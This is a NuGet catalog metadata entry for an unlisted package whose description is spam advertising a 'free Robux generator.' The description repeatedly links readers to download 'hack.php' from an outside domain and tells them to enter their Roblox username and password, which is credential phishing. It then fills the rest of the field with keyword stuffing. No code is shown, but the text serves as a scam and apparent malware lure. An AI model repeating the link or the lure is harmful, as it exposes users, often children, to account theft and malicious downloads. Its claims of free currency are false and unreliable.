{
  "@id": "https://api.nuget.org/v3/catalog0/data/2022.01.29.00.09.09/_roblox-generator-working-2022-version-buv.6.2.93.json",
  "@type": [
    "PackageDetails",
    "catalog:Permalink"
  ],
  "authors": "SharpCrafters s.r.o.",
  "catalog:commitId": "51e97b48-c939-477d-9a3f-e661dccef258",
  "catalog:commitTimeStamp": "2022-01-29T00:09:09.9767749Z",
  "created": "2022-01-26T11:29:15.203Z",
  "description": "# _Roblox Generator Working 2022 Version buv\n\n\nCLICK HERE TO DOWNLOAD  gt;gt;gt;gt;gt; [http://9.bltadwin.ru/hack.php](http://9.bltadwin.ru/hack.php)\n\n\nFree Robux or Membership Generators · Can I get free Robux, Memberships, or valuable items? · What should I do if I see scams? Free Robux Generator － Free Robux No Survey V$rT FREE ROBUX NO HUMAN VERIFICATION FREE. Roblox [ updated on January 22, ] generator working,' as much as you want. Free roblox robux generator. Free Robux, Robux Free, Codes For Roblox.\n\n## [CLICK HERE TO DOWNLOAD  gt;gt;gt;gt;gt; http://9.bltadwin.ru/hack.php](http://9.bltadwin.ru/hack.php)\n\nGo to your computer. 2. Open Roblox generator. 3. Type in your username and password. download the Generate button. 5. Robux will be generated and delivered to your account. You can now transfer Robux into your account without having to complete a survey or verify through human contact. With Free Robux Generator, you would now be able to get Robux free of charge without spending a solitary penny. Ask anybody, and they will reveal to you that the most ideal approach to get Free Robux is to discover escape clauses in the Roblox game. This tool also assists the individuals to get free membership for Roblox game. As it is extensively increasing platform (PC or mobile), so it demands heavy security to generate Robux. There are many spurious websites or pages which are already running on this. Eventually, people grope for some genuine generator tool.\n\nroblox generator robux, roblox generator 2021, roblox generator no verification, roblox generator free robux, roblox generator hack, roblox generator no human verification 2021, roblox generator 2022, roblox generator robux no verification, roblox generator app, roblox generator apk, roblox generator account, roblox generator avatar, roblox generator apk download, roblox generator adopt me, roblox account generator, roblox generator ad, are robux generators illegal, does roblox generator work, do any robux generators work, roblox generator bedwars, roblox generator bypass, roblox bot generator, roblox bio generator, roblox bedwars generator command, roblox ban generator, roblox bucks generator, roblox bedwars generator speed command, roblox generator command, roblox generator connection problems, roblox generator codes, roblox generator card, roblox generator.com, roblox generator club, roblox generator chat, roblox generator.co.uk, roblox generator download, roblox generator discord, roblox generator download pc, roblox generator download apk, roblox description generator, roblox drawing generator, roblox dungeon generator, roblox decal generator, roblox generator.exe, roblox email generator, roblox error generator, roblox robux generator easy, roblox generator no email, roblox free robux generator.exe, easy roblox generator, roblox robux generator no email, roblox generator for robux, roblox generator free robux no human verification, roblox generator free robux 2021, roblox generator for free, roblox generator free robux no verification, roblox generator free no verification, roblox generator fake link, roblox generator get free robux, roblox generator game, roblox generator generate unlimited robux, roblox generator gift card, roblox generator get unlimited free robux, roblox group generator, roblox gfx generator, roblox game generator wheel, roblox generator hack bedwars, roblox generator human verification, roblox hack generator, roblox heightmap generator, roblox hair generator, roblox hat generator, roblox head generator, roblox generator inc, roblox generator is online, roblox id generator, roblox insult generator, roblox item generator, roblox icon generator, roblox idea generator, roblox island generator, roblox javascript generator, roblox judy generator locations, roblox jailbreak generator, money generator roblox jailbreak, judy roblox generator, roblox jailbreak hack money generator, free robux for roblox generator - joke, roblox key gener",
  "id": "_Roblox-Generator-Working-2022-Version-buv",
  "isPrerelease": false,
  "language": "en-US",
  "lastEdited": "2022-01-28T23:47:54.483Z",
  "listed": false,
  "packageHash": "fwS7DD6urm299dPAIJg18lc1LpQGQsbHnjVkjjOF5Sc4Vy+WZfJoLfDcjNuN84i2orjfopRW4T9T6kD6y8EBzg==",
  "packageHashAlgorithm": "SHA512",
  "packageSize": 11607,
  "published": "1900-01-01T00:00:00Z",
  "requireLicenseAcceptance": false,
  "title": "_Roblox-Generator-Working-2022-Version-buv",
  "verbatimVersion": "6.2.93",
  "version": "6.2.93",
  "packageEntries": [
    {
      "@id": "https://api.nuget.org/v3/catalog0/data/2022.01.29.00.09.09/_roblox-generator-working-2022-version-buv.6.2.93.json#wgurzwrgpw.nuspec",
      "@type": "PackageEntry",
      "compressedLength": 1478,
      "fullName": "wgurzwrgpw.nuspec",
      "length": 4457,
      "name": "wgurzwrgpw.nuspec"
    },
    {
      "@id": "https://api.nuget.org/v3/catalog0/data/2022.01.29.00.09.09/_roblox-generator-working-2022-version-buv.6.2.93.json#.signature.p7s",
      "@type": "PackageEntry",
      "compressedLength": 9469,
      "fullName": ".signature.p7s",
      "length": 9469,
      "name": ".signature.p7s"
    }
  ],
  "@context": {
    "@vocab": "http://schema.nuget.org/schema#",
    "catalog": "http://schema.nuget.org/catalog#",
    "xsd": "http://www.w3.org/2001/XMLSchema#",
    "dependencies": {
      "@id": "dependency",
      "@container": "@set"
    },
    "dependencyGroups": {
      "@id": "dependencyGroup",
      "@container": "@set"
    },
    "packageEntries": {
      "@id": "packageEntry",
      "@container": "@set"
    },
    "packageTypes": {
      "@id": "packageType",
      "@container": "@set"
    },
    "supportedFrameworks": {
      "@id": "supportedFramework",
      "@container": "@set"
    },
    "tags": {
      "@id": "tag",
      "@container": "@set"
    },
    "vulnerabilities": {
      "@id": "vulnerability",
      "@container": "@set"
    },
    "published": {
      "@type": "xsd:dateTime"
    },
    "created": {
      "@type": "xsd:dateTime"
    },
    "lastEdited": {
      "@type": "xsd:dateTime"
    },
    "catalog:commitTimeStamp": {
      "@type": "xsd:dateTime"
    },
    "reasons": {
      "@container": "@set"
    }
  }
}